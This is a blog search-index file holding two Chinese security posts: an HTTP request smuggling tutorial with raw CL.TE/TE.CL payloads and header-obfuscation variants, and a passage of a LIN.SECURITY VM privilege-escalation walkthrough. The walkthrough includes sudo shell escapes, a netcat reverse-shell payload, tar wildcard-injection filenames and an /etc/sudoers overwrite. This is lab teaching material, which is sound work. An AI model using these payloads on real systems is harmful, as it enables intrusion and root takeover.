<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HTTP请求走私攻击</title>
      <link href="/passages/2020-03-14-HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/"/>
      <url>/passages/2020-03-14-HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200317161158.png" alt></p><a id="more"></a><h2 id="HTTP请求走私介绍"><a href="#HTTP请求走私介绍" class="headerlink" title="HTTP请求走私介绍"></a>HTTP请求走私介绍</h2><p>HTTP请求走私是一种<strong>干扰</strong>网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。 它使攻击者可以<strong>绕过安全控制</strong>，未经授权访问敏感数据并直接危害其他应用程序用户。</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200317161339.png" alt></p><p>当今的Web应用程序经常<strong>在用户和最终的应用程序逻辑之间使用HTTP服务器链</strong>。 用户将请求发送到前端服务器（有时称为<code>负载平衡器</code>（<strong>CDN</strong>）或<code>反向代理</code>），并且该服务器<strong>将请求转发</strong>到一个或多个后端服务器。 </p><p>当前端服务器将HTTP请求转发到后端服务器时，它通常会通过<strong>同一后端网络连接</strong>发送<strong>多个请求</strong>（<strong>一个连接，多个请求</strong>）因为这样做效率更高且性能更高。 该协议非常简单：HTTP请求一个接一个地发送，接收服务器解析HTTP请求标头以确定<strong>一个请求在哪里结束</strong>，<strong>下一个请求在哪里开始</strong>：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200317161416.png" alt></p><p>前端和后端系统就请求之间的<strong>边界</strong>达成一致。否则，攻击者可能会发送一个模棱两可的请求，该请求被前端和后端系统<strong>以不同的方式解释</strong>（攻击者使得<strong>前端请求的一部分</strong>被后端解释执行为<strong>下个请求的开始</strong>，干扰后端应用程序处理该请求的方式）：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200317161436.png" alt></p><h2 id="为什么会造成HTTP请求走私"><a href="#为什么会造成HTTP请求走私" class="headerlink" title="为什么会造成HTTP请求走私"></a>为什么会造成HTTP请求走私</h2><p>大多数HTTP请求走私漏洞的出现是因为HTTP规范提供了<strong>两种不同的方法来指定请求的结束位置</strong>：<code>Content-Length</code>头和<code>Transfer-Encoding</code>头。</p><ul><li><code>Content-Length</code></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: normal-website.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 11</span><br><span class="line"></span><br><span class="line">q=smuggling</span><br></pre></td></tr></table></figure><ul><li><code>Transfer-Encoding</code></li></ul><p>使用<code>Transfer-Encoding</code>头指定请求体正文使用分块编码。 这意味着消息正文包含一个或多个数据块。 每个块均包含以字节为单位的块大小（以十六进制表示），其后是换行符，然后是块内容。 该消息以大小为零的块终止。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/search</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: normal-website.com</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">b</span></span><br><span class="line">q=smuggling</span><br><span class="line"><span class="attribute">0</span></span><br></pre></td></tr></table></figure><blockquote><p>Burp Suite会自动解压缩分块的编码，以使在请求中更易于查看和编辑。<br>浏览器通常不会在请求中使用分块编码，通常只能在服务器响应中看到。</p></blockquote><p>由于HTTP规范提供了<strong>两种</strong>不同的方法来指定HTTP消息的长度，因此单个消息可能会同时使用这两种方法，从而使它们彼此冲突。 HTTP规范试图通过指出<strong>如果同时存在</strong><code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头来防止此问题，则应该<strong>忽略</strong><code>Content-Length</code>标头。当仅使用一台服务器时，这足以避免歧义，但是当将两个或多个服务器链接在一起时，这并不能避免歧义。在这种情况下，可能由于两个原因而出现问题：</p><blockquote><p>某些服务器在请求中不支持Transfer-Encoding标头。<br>如果以某种方式混淆了标头，则某些确实支持Transfer-Encoding标头的服务器将不被处理。</p></blockquote><p>如果前端服务器和后端服务器在（可能是混淆的）<code>Transfer-Encoding</code>标头的行为不同，则它们可能在<strong>连续请求之间的边界上</strong>存在分歧，从而导致请求走私漏洞</p><h2 id="如何实施请求走私攻击"><a href="#如何实施请求走私攻击" class="headerlink" title="如何实施请求走私攻击"></a>如何实施请求走私攻击</h2><p>请求走私攻击涉及将<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头都放置在<strong>单个HTTP请求</strong>中，并对其进行处理，以便前端服务器和后端服务器以不同的方式处理请求。 完成此操作的确切方式取决于两个服务器的行为：</p><ul><li><code>CL.TE</code>：前端服务器使用<code>Content-Length</code>标头，而后端服务器使用<code>Transfer-Encoding</code>标头。</li><li><code>TE.CL</code>：前端服务器使用<code>Transfer-Encoding</code>标头，而后端服务器使用<code>Content-Length</code>标头。</li><li><code>TE.TE</code>：前端服务器和后端服务器都支持<code>Transfer-Encoding</code>标头，但是可以通过<strong>对标头进行某种方式的混淆</strong>来诱导其中一台服务器不对其进行处理。</li></ul><h3 id="CL-TE"><a href="#CL-TE" class="headerlink" title="CL.TE"></a><code>CL.TE</code></h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span>: 13</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">SMUGGLED</span></span><br></pre></td></tr></table></figure><p>前端服务器处理<code>Content-Length</code>标头，并确定请求主体的长度为13个字节，直至SMUGGLED的末尾。 该请求被转发到后端服务器。（回车换行是两个字符<code>CR</code> <code>LF</code>）</p><p>后端服务器处理<code>Transfer-Encoding</code>标头，因此将消息正文视为使用分块编码。 它处理第一个块，该块被声明为零长度，因此被视为终止请求。 <strong>接下来的字节SMUGGLED未经处理，后端服务器会将其视为序列中下一个请求的开始</strong>。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te</a></p><p>实验描述：</p><blockquote><p>本实验涉及前端服务器和后端服务器，并且<strong>前端服务器不支持分块编码</strong>。<strong>前端服务器拒绝使用GET或POST方法之外的请求</strong>。<br>要解决此问题，请向后端服务器<strong>走私一个请求</strong>，以便后端服务器处理的下一个请求似乎使用<strong>GPOST</strong>方法。</p></blockquote><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200317161501.png" alt></p><ul><li>请求为POST</li><li>前端不支持<code>TE</code>，<code>CL</code>和<code>TE</code>同时存在时，后端优先<code>CL</code></li><li>发送两次请求</li></ul><h3 id="TE-CL"><a href="#TE-CL" class="headerlink" title="TE.CL"></a><code>TE.CL</code></h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Length</span>: 3</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">8</span></span><br><span class="line"><span class="attribute">SMUGGLED</span></span><br><span class="line">0    # \r\n</span><br><span class="line">     # \r\n</span><br><span class="line">     # 光标在此处</span><br></pre></td></tr></table></figure><blockquote><p>要使用Burp Repeater发送此请求，您首先需要转到Repeater菜单，并确保<strong>未选中</strong> “Update Content-Length”选项<br>需要在结尾的0后面加上尾随序列\ r \ n \ r \ n</p></blockquote><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200317161529.png" alt></p><p>前端服务器处理<code>Transfer-Encoding</code>标头，因此将消息正文视为使用分块编码。 它处理第一个块，声明为8个字节长，直到SMUGGLED之后的行的开始。 它处理第二个数据块，该数据块的长度为零，因此被视为终止请求。 该请求被转发到后端服务器。</p><p>后端服务器处理<code>Content-Length</code>标头，并确定请求正文的长度为3个字节，直到8之后的行的开头（<code>8</code> <code>\r</code> <code>\n</code>）。其余字节（<strong>从SMUGGLED开始</strong>）一直未处理，<strong>后端服务器会将其视为序列中下一个请求的开始</strong>。</p><h4 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h4><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p><p><strong>实验描述</strong>：</p><blockquote><p>本实验涉及前端服务器和后端服务器，<strong>后端服务器不支持分块编码</strong>。<strong>前端服务器拒绝使用GET或POST方法之外的请求</strong>。<br>要解决此问题，请<strong>向后端服务器走私一个请求</strong>，以便后端服务器处理的下一个请求似乎使用<strong>GPOST</strong>方法。</p></blockquote><p>首先关闭<code>repeater</code>的“Update Content-Length”选项</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200317161554.png" alt></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200317161609.png" alt></p><h3 id="TE-TE-混淆-TE-头"><a href="#TE-TE-混淆-TE-头" class="headerlink" title="TE.TE 混淆 TE 头"></a><code>TE.TE</code> 混淆 TE 头</h3><p>前端服务器和后端服务器<strong>都支持</strong><code>Transfer-Encoding</code>标头，但是可以通过<strong>对标头进行某种方式的混淆</strong>来诱导<strong>其中一台服务器不对其进行处理</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Transfer-Encoding: x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line">[space]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">X: X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding</span><br><span class="line">: chunked</span><br></pre></td></tr></table></figure><p>要发现<code>TE.TE</code>漏洞，必须找到<code>Transfer-Encoding</code>标头的<strong>某些变体</strong>，以便<strong>只有</strong>前端服务器或后端服务器之一对其进行处理，而另一服务器将其忽略。</p><p>这取决于是否诱使前端服务器或后端服务器<strong>不处理混淆的</strong><code>Transfer-Encoding</code>标头，其余的攻击将采用与<code>CL.TE</code>或<code>TE.CL</code>漏洞相同的形式已经描述过了。</p><h4 id="实验-2"><a href="#实验-2" class="headerlink" title="实验"></a>实验</h4><p><a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header</a></p><p><strong>实验描述</strong>：</p><blockquote><p>本实验涉及一个前端和后端服务器，<strong>两个服务器以不同的方式处理重复的HTTP请求标头</strong>。 <strong>前端服务器拒绝使用GET或POST方法之外的请求</strong>。<br>要解决此问题，请<strong>向后端服务器走私一个请求</strong>，以便后端服务器处理的下一个请求似乎使用<strong>GPOST</strong>方法。</p></blockquote><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200317161633.png" alt></p><ul><li><code>TE.CL</code>：后端服务器被混淆，不处理<code>Transfer-Encoding</code>，使用<code>CL</code>头</li></ul><h2 id="如何防御请求走私攻击"><a href="#如何防御请求走私攻击" class="headerlink" title="如何防御请求走私攻击"></a>如何防御请求走私攻击</h2><ul><li>禁用后端连接的重用，以便每个后端请求通过单独的网络连接发送。</li><li>使用HTTP / 2进行后端连接，因为此协议可防止对请求之间的边界产生歧义。</li><li>前端服务器和后端服务器使用完全相同的Web服务器软件，以便它们就请求之间的界限达成一致。</li></ul><p>Next to Learn：</p><p><img src="https://i.imgur.com/VG19urB.png" alt><br><img src="https://i.imgur.com/FbW3FcM.png" alt></p><h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><p><a href="https://paper.seebug.org/1048/" target="_blank" rel="noopener">协议层的攻击——HTTP请求走私</a></p><p><a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">HTTP request smuggling</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权知识学习-LIN.SECURITY靶场</title>
      <link href="/passages/2020-02-22-%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0-LIN-SECURITY%E9%9D%B6%E5%9C%BA/"/>
      <url>/passages/2020-02-22-%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0-LIN-SECURITY%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<blockquote><p>学习Linux提权知识的靶场</p></blockquote><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200224135548.png" alt></p><a id="more"></a><p>靶场地址：<a href="https://www.vulnhub.com/entry/linsecurity-1,244/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/linsecurity-1,244/</a></p><p>低权限用户：<code>bob:secret</code></p><p>此靶场为<strong>Linux 配置问题导致提权</strong></p><h2 id="靶机设置"><a href="#靶机设置" class="headerlink" title="靶机设置"></a>靶机设置</h2><h3 id="修改默认键盘布局"><a href="#修改默认键盘布局" class="headerlink" title="修改默认键盘布局"></a>修改默认键盘布局</h3><p>该靶机的默认键盘布局不是美式的，敲击<code>|</code>会出现<code>~</code></p><p>首先运行命令：<code>sudo awk &#39;BEGIN {system(&quot;/bin/sh&quot;)}&#39;</code>（<code>&quot;</code>布局改变了，多试几个），<strong>提升为root用户</strong>，方便后面的修改配置文件。</p><p>修改配置文件：<code>sudo vim /etc/default/keyboard</code>，将里面的<code>XKBLAYOUT</code>变量的值改为<code>us</code>，然后在文字终端（ctrl+Alt+F2那种）运行：<code>setupcon</code></p><h3 id="配置网卡"><a href="#配置网卡" class="headerlink" title="配置网卡"></a>配置网卡</h3><p>Ubuntu 18通过<code>netplan</code>设置网络。</p><p>同上，先提权到root用户。</p><p><code>ifconfig -a</code>看到有一块<code>ens33</code>的网卡，但是没有生效。</p><p><code>sudo vim /etc/netplan/50-cloud-init.yaml</code>：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221155727.png" alt></p><p>将<code>enp0s3</code>改为<code>ens33</code>，<code>sudo netplan apply</code>重启网络</p><h2 id="简单信息搜集"><a href="#简单信息搜集" class="headerlink" title="简单信息搜集"></a>简单信息搜集</h2><h3 id="检测当前用户权限"><a href="#检测当前用户权限" class="headerlink" title="检测当前用户权限"></a>检测当前用户权限</h3><p><code>whoami</code>  <code>id</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200219210332.png" alt></p><h3 id="查看系统的发行版本和内核版本"><a href="#查看系统的发行版本和内核版本" class="headerlink" title="查看系统的发行版本和内核版本"></a>查看系统的发行版本和内核版本</h3><p><code>lsb_release -a</code></p><p><code>uname -a</code></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200219210411.png" alt></p><h3 id="查看运行的服务及安装的程序"><a href="#查看运行的服务及安装的程序" class="headerlink" title="查看运行的服务及安装的程序"></a>查看运行的服务及安装的程序</h3><h2 id="1-sudo-提权"><a href="#1-sudo-提权" class="headerlink" title="1. sudo  提权"></a>1. sudo  提权</h2><p><strong>关于sudo命令</strong>：</p><p>sudo权限是root把本来只能超级用户执行的命令<strong>赋予普通用户执行</strong></p><p>要配置sudo，具体是修改<code>/etc/sudoers</code></p><p><strong>提权姿势</strong>：</p><p>采用<code>sudo -l</code>这个命令来<strong>查看自己是否有sudo配置</strong></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200219213139.png" alt></p><p>拥有sudo的<code>ash</code>、<code>awk</code>等权限</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200219213232.png" alt></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200219213332.png" alt></p><p><code>find</code>命令也可提权：<code>find . -exec /bin/sh \; -quit</code></p><p><strong>在线查询sudo的提权命令</strong>：<a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p><h2 id="2-etc-passwd的哈希"><a href="#2-etc-passwd的哈希" class="headerlink" title="2. /etc/passwd的哈希"></a>2. /etc/passwd的哈希</h2><p>linux的用户密码哈希存储在<code>/etc/shadow</code>文件，<strong>普通用户</strong>能够查看到的则是<code>/etc/passwd</code>这个文件</p><p>在<code>/etc/passwd</code>中，比如：<code>root:x:0:0:root:/root:/bin/bash</code>。账户的<strong>第二列</strong>是密码哈希，如果该列为<code>x</code>则代表密码哈希存储在<code>/etc/shadow</code>文件上</p><h3 id="etc-passwd"><a href="#etc-passwd" class="headerlink" title="/etc/passwd"></a>/etc/passwd</h3><p><strong>普通用户权限能够查看</strong></p><p>保存用户信息，每一行代表一个用户，每一行通过冒号<code>:</code>分为七个部分</p><ol><li>用户名</li><li>密码，x表示密码保存在<code>/etc/shadow</code></li><li>UID，0代表root</li><li>GID，表示所在组</li><li>描述信息，依次为<code>Full Name</code>、<code>Room Number</code>、<code>Work Phone</code>、<code>Home Phone</code>和<code>Other</code></li><li>用户主目录</li><li>默认shell类型</li></ol><p><strong>eg.</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test2:x:1001:1001:test2,11111,111111-11,222222-22,test:/home/test2:/bin/bash</span><br></pre></td></tr></table></figure><ul><li>用户名：test2</li><li>密码保存在<code>/etc/shadow</code></li><li>UID为<code>1001</code></li><li>GID为<code>1001</code></li><li>描述信息：<code>Full Name []: test2  Room Number []: 11111  Work Phone []: 111111-11  Home Phone []: 222222-22  Other []: test</code></li><li>用户主目录为<code>/home/test2</code></li><li>默认shell为<code>/bin/bash</code></li></ul><h3 id="etc-shadow"><a href="#etc-shadow" class="headerlink" title="/etc/shadow"></a>/etc/shadow</h3><p><strong>只有root用户权限能够查看</strong></p><p>保存加密后的密码和用户的相关密码信息，每一行代表一个用户，每一行通过冒号<code>:</code>分为九个部分</p><ol><li>用户名</li><li>加密后的密码</li><li>上次修改密码的时间(从1970.1.1开始的总天数)</li><li>两次修改密码间隔的最少天数，如果为0，则没有限制</li><li>两次修改密码间隔最多的天数,表示该用户的密码会在多少天后过期，如果为99999则没有限制</li><li>提前多少天警告用户密码将过期</li><li>在密码过期之后多少天禁用此用户</li><li>用户过期日期(从1970.1.1开始的总天数)，如果为0，则该用户永久可用</li><li>保留</li></ol><p><strong>注：</strong></p><p>参数说明可通过<code>man shadow</code>获取</p><p><strong>eg.</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test2:$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0:17470:0:99999:7:::</span><br></pre></td></tr></table></figure><ul><li>用户名：test2</li><li>加密后的密码：<code>$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0</code></li><li>上次修改密码的时间(从1970.1.1开始的总天数为17470)</li><li>两次修改密码间隔：没有限制</li><li>两次修改密码间隔最多的天数：没有限制</li><li>提前7天警告用户密码将过期</li><li>该用户永久可用</li></ul><p>由示例可知，<strong>加密的密码具有固定格式</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id$salt$encrypted</span><br></pre></td></tr></table></figure><ul><li><p><code>id</code>表示<strong>加密算法</strong>，<code>1</code>代表<code>MD5</code>，<code>5</code>代表<code>SHA-256</code>，<code>6</code>代表<code>SHA-512</code></p></li><li><p><code>salt</code>为盐值,系统随机生成</p></li><li><p><code>encrypted</code>表示密码的<code>hash值</code></p></li></ul><h3 id="靶机提权演示"><a href="#靶机提权演示" class="headerlink" title="靶机提权演示"></a>靶机提权演示</h3><p>查看<code>/etc/passwd</code>文件：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221142135.png" alt></p><p><code>insecurity</code>用户，<code>uid</code>和<code>gid</code>均为0（root），并且已经显示了密码的hash。</p><p><code>cmd5</code>尝试破解：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221142248.png" alt></p><p>收费，试试<code>somd5</code>：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221142310.png" alt></p><p>进行提权：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221142540.png" alt></p><h3 id="破解用户密码hash的常用工具和方法"><a href="#破解用户密码hash的常用工具和方法" class="headerlink" title="破解用户密码hash的常用工具和方法"></a>破解用户密码hash的常用工具和方法</h3><h4 id="在线网站查询"><a href="#在线网站查询" class="headerlink" title="在线网站查询"></a>在线网站查询</h4><p><a href="https://cmd5.com" target="_blank" rel="noopener">https://cmd5.com</a></p><p><a href="https://www.somd5.com/" target="_blank" rel="noopener">https://www.somd5.com/</a></p><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><p><strong>John the Ripper</strong> 和 <strong>hashcat</strong></p><p>Kali2.0集成了<code>John the Ripper</code>和<code>hashcat</code></p><p><a href="https://klionsec.github.io/2017/04/26/use-john/" target="_blank" rel="noopener">https://klionsec.github.io/2017/04/26/use-john/</a></p><p><a href="https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/" target="_blank" rel="noopener">https://klionsec.github.io/2017/04/26/use-hashcat-crack-hash/</a></p><p><strong>mimipenguin</strong></p><p><a href="https://github.com/huntergregal/mimipenguin" target="_blank" rel="noopener">https://github.com/huntergregal/mimipenguin</a></p><p>原理类似于<code>mimikatz</code>，通过内存导出明文密码</p><h2 id="3-利用定时任务cron以及通配符"><a href="#3-利用定时任务cron以及通配符" class="headerlink" title="3. 利用定时任务cron以及通配符"></a>3. 利用定时任务cron以及通配符</h2><p><strong>crontab文件格式</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">基本格式 :</span><br><span class="line"> *　　*　　*　　*　　*　　command</span><br><span class="line"> 分　 时　 日　 月　 周　 命令</span><br></pre></td></tr></table></figure><p>第1列表示分钟1～59 每分钟用<code>*</code>或者 <code>*/1</code>表示<br>第2列表示小时1～23（0表示0点）<br>第3列表示日期1～31<br>第4列表示月份1～12<br>第5列标识号星期0～6（0表示星期天）<br>第6列要运行的命令</p><p><strong>eg</strong>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">30 21 * * * /usr/local/etc/rc.d/lighttpd restart</span><br><span class="line">上面的例子表示每晚的21:30重启apache。</span><br><span class="line"></span><br><span class="line">45 4 1,10,22 * * /usr/local/etc/rc.d/lighttpd restart</span><br><span class="line">上面的例子表示每月1、10、22日的4 : 45重启apache。</span><br><span class="line"></span><br><span class="line">10 1 * * 6,0 /usr/local/etc/rc.d/lighttpd restart</span><br><span class="line">上面的例子表示每周六、周日的1 : 10重启apache。</span><br></pre></td></tr></table></figure><p>查看/etc/crontab的定时任务会<strong>产生一些有趣的结果</strong></p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221144805.png" alt></p><p>查看<code>/etc/cron.daily/backup</code>文件：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221165016.png" alt></p><p>这个定时任务的执行权限是root，将用户家目录下的文件备份到<code>/etc/backups/</code>下，<strong>使用通配符<code>*</code></strong></p><p>利用通配符进行Linux本地提权：<a href="https://blog.csdn.net/qq_27446553/article/details/80943097" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/80943097</a></p><p><strong>反弹shell</strong>：</p><p>使用<code>msfvenom</code>生成<strong>nc反弹shell一句话</strong>（直接print到终端）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_netcat lhost=127.0.0.1 lport=8888 R</span><br></pre></td></tr></table></figure><ul><li><code>-p</code>：payload</li><li><code>R</code>：RAW 原始数据</li></ul><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221170056.png" alt></p><p>将次payload写入<code>shell.sh</code>，并赋予执行权限：（在<strong>tar处理的目录下</strong>写入shell.sh）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;mkfifo /tmp/jvenbd; nc 127.0.0.1 8888 0&lt;/tmp/jvenbd | /bin/sh &gt;/tmp/jvenbd 2&gt;&amp;1; rm /tmp/jvenbd&quot; &gt; shell.sh &amp;&amp; chmod +x shell.sh</span><br></pre></td></tr></table></figure><p>再创建两个文件：<code>--checkpoint-action=exec=sh shell.sh</code> 和 <code>--checkpoint=1</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;</span><br><span class="line">echo &gt; &quot;--checkpoint=1&quot;</span><br></pre></td></tr></table></figure><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221170528.png" alt></p><p>接着<code>nc -lp 8888 -vv</code>开启本地监听，等待定时任务的反弹连接：</p><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200221170933.png" alt></p><p>实际上，<strong>定时任务执行的命令</strong>为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar -zcf /etc/backups/home-bob.tgz *</span><br><span class="line">|</span><br><span class="line">|-&gt;</span><br><span class="line">tar -zcf /etc/backups/home-bob.tgz --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh</span><br></pre></td></tr></table></figure><ul><li><code>--checkpoint-action</code>选项：用于指定<strong>到达检查点时将要执行的程序</strong>，这将允许我们运行一个任意的命令。</li></ul><p>因此，选项<code>--checkpoint=1</code> 和 <code>--checkpoint-action=exec=sh shell.sh</code><strong>作为命令行选项</strong>交给了tar程序。</p><p><strong>直接修改<code>/etc/sudoers</code>文件</strong>：</p><p><code>echo &#39;echo &quot;ignite ALL=(root) NOPASSWD: ALL&quot; &gt; /etc/sudoers&#39; &gt;shell.sh</code></p><h2 id="4-利用隐藏文件"><a href="#4-利用隐藏文件" class="headerlink" title="4. 利用隐藏文件"></a>4. 利用隐藏文件</h2><p>有时候<strong>隐藏文件</strong>会存放一些重要的信息，比如我们<strong>搜索home目录下的所有隐藏文件</strong>，并用ls -al显示出来。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name ".*" -type f -path "/home/*" -exec ls -al &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><code>-ipath p</code>, <code>-path p</code>：<strong>路径名称符合 p</strong> 的文件，ipath 会忽略大小写</p><p><img 